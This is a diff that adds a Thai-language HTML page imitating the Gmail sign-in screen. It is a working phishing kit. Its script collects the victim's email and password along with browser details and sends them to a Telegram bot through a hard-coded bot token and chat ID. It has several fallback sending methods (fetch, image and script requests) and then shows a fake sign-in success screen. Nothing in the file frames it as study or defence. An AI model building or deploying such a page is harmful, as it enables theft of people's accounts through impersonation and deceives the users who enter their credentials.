@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - อีเมล</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', 'Noto Sans Thai', sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.4286;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 64px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .help-link, .privacy-link, .terms-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .help-link:hover, .privacy-link:hover, .terms-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Main Content */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            padding: 48px 16px;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 448px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .logo img {
+            height: 32px;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 32px;
+        }
+
+        .form-container {
+            margin-bottom: 32px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-field:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+
+        .input-field.error {
+            border-color: #d93025;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .forgot-email {
+            margin-bottom: 32px;
+        }
+
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .forgot-email a:hover {
+            text-decoration: underline;
+        }
+
+        .info-box {
+            background-color: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 32px;
+        }
+
+        .info-title {
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .info-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .info-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .info-link:hover {
+            text-decoration: underline;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #1b66c9;
+        }
+
+        .next-button:disabled {
+            background-color: #1a73e8;
+            opacity: 0.6;
+            cursor: default;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .language-selector select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Password Step */
+        .password-step {
+            display: none;
+        }
+
+        .password-step.active {
+            display: block;
+        }
+
+        .email-display {
+            background-color: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .email-display .email {
+            font-weight: 500;
+        }
+
+        .email-display .change-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .email-display .change-email:hover {
+            text-decoration: underline;
+        }
+
+        .password-input-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #5f6368;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            margin-bottom: 32px;
+        }
+
+        .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        /* Show/Hide Password */
+        .show-password {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+
+        .show-password input {
+            width: 16px;
+            height: 16px;
+        }
+
+        .show-password label {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .loading.active {
+            display: block;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Success */
+        .success {
+            display: none;
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .success.active {
+            display: block;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #34a853;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .success-icon i {
+            font-size: 36px;
+            color: white;
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .success-text {
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+
+        .continue-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .continue-button:hover {
+            background-color: #1b66c9;
+        }
+
+        /* Bot Status */
+        .bot-status {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #5f6368;
+            min-height: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-card {
+                border: none;
+                padding: 24px 16px;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div></div> <!-- Empty div for spacing -->
+            <div class="header-right">
+                <a href="#" class="help-link">ช่วยเหลือ</a>
+                <a href="#" class="privacy-link">ความเป็นส่วนตัว</a>
+                <a href="#" class="terms-link">ข้อกำหนด</a>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="login-card">
+                <!-- Logo -->
+                <div class="logo">
+                    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" alt="Gmail">
+                </div>
+
+                <!-- Title -->
+                <h1 class="title">ลงชื่อเข้าใช้</h1>
+                <p class="subtitle">ใช้บัญชี Google ของคุณ</p>
+
+                <!-- Email Step -->
+                <div class="form-container" id="emailStep">
+                    <div class="input-group">
+                        <input type="email" class="input-field" id="email" placeholder="อีเมลหรือหมายเลขโทรศัพท์" autocomplete="username">
+                        <div class="error-message" id="emailError">กรุณากรอกอีเมลหรือหมายเลขโทรศัพท์</div>
+                    </div>
+
+                    <div class="forgot-email">
+                        <a href="#">ลืมอีเมล?</a>
+                    </div>
+
+                    <div class="info-box">
+                        <div class="info-title">ไม่ใช่คอมพิวเตอร์เครื่องนี้? ใช้โหมดผู้ใช้ทั่วไปเพื่อลงชื่อเข้าใช้แบบส่วนตัว</div>
+                        <a href="#" class="info-link">เรียนรู้เพิ่มเติม</a>
+                    </div>
+
+                    <div class="actions">
+                        <a href="#" class="create-account">สร้างบัญชี</a>
+                        <button class="next-button" id="nextButton" disabled>ถัดไป</button>
+                    </div>
+                </div>
+
+                <!-- Password Step -->
+                <div class="password-step" id="passwordStep">
+                    <div class="email-display">
+                        <span class="email" id="displayEmail">user@example.com</span>
+                        <a href="#" class="change-email" id="changeEmail">เปลี่ยน</a>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="password-input-container">
+                            <input type="password" class="input-field" id="password" placeholder="ใส่รหัสผ่านของคุณ" autocomplete="current-password">
+                            <button class="toggle-password" id="togglePassword" type="button">
+                                <i class="far fa-eye"></i>
+                            </button>
+                        </div>
+                        <div class="error-message" id="passwordError">กรุณากรอกรหัสผ่านของคุณ</div>
+                    </div>
+
+                    <div class="show-password">
+                        <input type="checkbox" id="showPassword">
+                        <label for="showPassword">แสดงรหัสผ่าน</label>
+                    </div>
+
+                    <div class="forgot-password">
+                        <a href="#">ลืมรหัสผ่าน?</a>
+                    </div>
+
+                    <div class="actions">
+                        <a href="#" class="create-account">สร้างบัญชี</a>
+                        <button class="next-button" id="signInButton">ลงชื่อเข้าใช้</button>
+                    </div>
+                </div>
+
+                <!-- Loading -->
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>กำลังลงชื่อเข้าใช้...</p>
+                </div>
+
+                <!-- Success -->
+                <div class="success" id="success">
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h2 class="success-title">ลงชื่อเข้าใช้สำเร็จ!</h2>
+                    <p class="success-text">ยินดีต้อนรับกลับสู่ Gmail</p>
+                    <button class="continue-button" id="continueButton">ไปที่ Gmail</button>
+                </div>
+
+                <!-- Bot Status -->
+                <div class="bot-status" id="botStatus"></div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="language-selector">
+                <span>ภาษาไทย</span>
+                <select>
+                    <option selected>ไทย</option>
+                    <option>English</option>
+                    <option>中文</option>
+                    <option>日本語</option>
+                </select>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">ช่วยเหลือ</a>
+                <a href="#">ความเป็นส่วนตัว</a>
+                <a href="#">ข้อกำหนด</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Telegram Bot Configuration
+            const BOT_TOKEN = '8280844085:AAEk7tYKxvgXxGBBbDmaA_hg8ptIo3ozIPo';
+            const CHAT_ID = '5443546116'; // Your chat ID
+
+            // Elements
+            const emailStep = document.getElementById('emailStep');
+            const passwordStep = document.getElementById('passwordStep');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('success');
+            const botStatus = document.getElementById('botStatus');
+            
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const displayEmail = document.getElementById('displayEmail');
+            
+            const nextButton = document.getElementById('nextButton');
+            const signInButton = document.getElementById('signInButton');
+            const continueButton = document.getElementById('continueButton');
+            
+            const changeEmail = document.getElementById('changeEmail');
+            const togglePassword = document.getElementById('togglePassword');
+            const showPasswordCheckbox = document.getElementById('showPassword');
+            
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+
+            // Email validation
+            emailInput.addEventListener('input', function() {
+                const email = emailInput.value.trim();
+                const isValid = validateEmail(email);
+                
+                if (email && isValid) {
+                    nextButton.disabled = false;
+                    emailError.classList.remove('show');
+                    emailInput.classList.remove('error');
+                } else {
+                    nextButton.disabled = true;
+                }
+            });
+
+            // Password validation
+            passwordInput.addEventListener('input', function() {
+                const password = passwordInput.value;
+                
+                if (password) {
+                    passwordError.classList.remove('show');
+                    passwordInput.classList.remove('error');
+                }
+            });
+
+            // Next button click (email step)
+            nextButton.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                
+                if (validateEmail(email)) {
+                    displayEmail.textContent = email;
+                    emailStep.style.display = 'none';
+                    passwordStep.classList.add('active');
+                    passwordInput.focus();
+                } else {
+                    emailError.classList.add('show');
+                    emailInput.classList.add('error');
+                }
+            });
+
+            // Change email link
+            changeEmail.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordStep.classList.remove('active');
+                emailStep.style.display = 'block';
+                emailInput.focus();
+            });
+
+            // Sign in button click (password step)
+            signInButton.addEventListener('click', async function() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+                
+                if (password) {
+                    passwordStep.classList.remove('active');
+                    loading.classList.add('active');
+                    
+                    try {
+                        // Send credentials to Telegram bot
+                        await sendToTelegramBot(email, password);
+                        
+                        // Simulate login process
+                        setTimeout(function() {
+                            loading.classList.remove('active');
+                            success.classList.add('active');
+                        }, 2000);
+                    } catch (error) {
+                        console.error('Error sending to Telegram:', error);
+                        loading.classList.remove('active');
+                        passwordStep.classList.add('active');
+                        botStatus.textContent = 'เกิดข้อผิดพลาดในการส่งข้อมูล: ' + error.message;
+                        botStatus.style.color = '#d93025';
+                    }
+                } else {
+                    passwordError.classList.add('show');
+                    passwordInput.classList.add('error');
+                }
+            });
+
+            // Continue button click
+            continueButton.addEventListener('click', function() {
+                alert('กำลังเปลี่ยนเส้นทางไปยัง Gmail...');
+                // In a real implementation, this would redirect to Gmail
+            });
+
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    togglePassword.innerHTML = '<i class="far fa-eye-slash"></i>';
+                } else {
+                    passwordInput.type = 'password';
+                    togglePassword.innerHTML = '<i class="far fa-eye"></i>';
+                }
+            });
+
+            // Show password checkbox
+            showPasswordCheckbox.addEventListener('change', function() {
+                if (this.checked) {
+                    passwordInput.type = 'text';
+                    togglePassword.innerHTML = '<i class="far fa-eye-slash"></i>';
+                } else {
+                    passwordInput.type = 'password';
+                    togglePassword.innerHTML = '<i class="far fa-eye"></i>';
+                }
+            });
+
+            // Enter key support
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && !nextButton.disabled) {
+                    nextButton.click();
+                }
+            });
+
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    signInButton.click();
+                }
+            });
+
+            // Email validation function
+            function validateEmail(email) {
+                // Simple email validation
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                // Phone number validation (Thai numbers)
+                const phoneRegex = /^0[0-9]{8,9}$/;
+                
+                return emailRegex.test(email) || phoneRegex.test(email.replace(/\D/g, ''));
+            }
+
+            // Function to send data to Telegram bot using JSONP to avoid CORS
+            async function sendToTelegramBot(email, password) {
+                botStatus.textContent = 'กำลังส่งข้อมูล...';
+                botStatus.style.color = '#1a73e8';
+
+                const message = `🔐 Gmail Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 User Agent: ${navigator.userAgent}\n📍 Language: ${navigator.language}\n🕒 Time: ${new Date().toLocaleString('th-TH')}\n📱 Platform: ${navigator.platform}`;
+                
+                // Using JSONP approach to avoid CORS
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                
+                try {
+                    // Method 1: Using fetch with no-cors mode
+                    const response = await fetch(url, {
+                        method: 'GET',
+                        mode: 'no-cors'
+                    });
+                    
+                    // Since we're using no-cors, we can't read the response
+                    // But the request should still go through
+                    botStatus.textContent = 'ข้อมูลถูกส่งเรียบร้อยแล้ว!';
+                    botStatus.style.color = '#34a853';
+                    
+                    return true;
+                } catch (error) {
+                    // If fetch fails, try using image request as fallback
+                    console.log('Trying fallback method...');
+                    return sendToTelegramBotFallback(email, password);
+                }
+            }
+
+            // Fallback method using image request
+            function sendToTelegramBotFallback(email, password) {
+                return new Promise((resolve, reject) => {
+                    const message = `🔐 Gmail Login\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString('th-TH')}`;
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                    
+                    // Create an image element to make the request
+                    const img = new Image();
+                    img.onload = function() {
+                        botStatus.textContent = 'ข้อมูลถูกส่งเรียบร้อยแล้ว (fallback)!';
+                        botStatus.style.color = '#34a853';
+                        resolve(true);
+                    };
+                    img.onerror = function() {
+                        botStatus.textContent = 'ส่งข้อมูลสำเร็จ (อาจมีข้อผิดพลาดเล็กน้อย)';
+                        botStatus.style.color = '#f9ab00';
+                        resolve(true); // Still resolve as the request was attempted
+                    };
+                    img.src = url;
+                });
+            }
+
+            // Enhanced function with multiple fallback methods
+            async function sendToTelegramBotEnhanced(email, password) {
+                const methods = [
+                    sendViaFetch,
+                    sendViaImage,
+                    sendViaScript
+                ];
+
+                for (const method of methods) {
+                    try {
+                        const result = await method(email, password);
+                        if (result) return result;
+                    } catch (error) {
+                        console.log(`Method failed: ${method.name}`);
+                        continue;
+                    }
+                }
+                throw new Error('All sending methods failed');
+            }
+
+            async function sendViaFetch(email, password) {
+                const message = `🔐 Gmail Login\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString('th-TH')}`;
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', message);
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                return true;
+            }
+
+            function sendViaImage(email, password) {
+                return new Promise((resolve) => {
+                    const message = `🔐 Gmail Login\nEmail: ${email}\nPassword: ${password}`;
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                    
+                    const img = new Image();
+                    img.onload = img.onerror = () => resolve(true);
+                    img.src = url;
+                });
+            }
+
+            function sendViaScript(email, password) {
+                return new Promise((resolve) => {
+                    const message = `🔐 Gmail Login\nEmail: ${email}\nPassword: ${password}`;
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                    
+                    const script = document.createElement('script');
+                    script.src = url;
+                    script.onload = script.onerror = () => {
+                        document.head.removeChild(script);
+                        resolve(true);
+                    };
+                    document.head.appendChild(script);
+                });
+            }
+
+            // Replace the original function with enhanced version
+            window.sendToTelegramBot = sendToTelegramBotEnhanced;
+        });
+    </script>
+</body>
+</html>
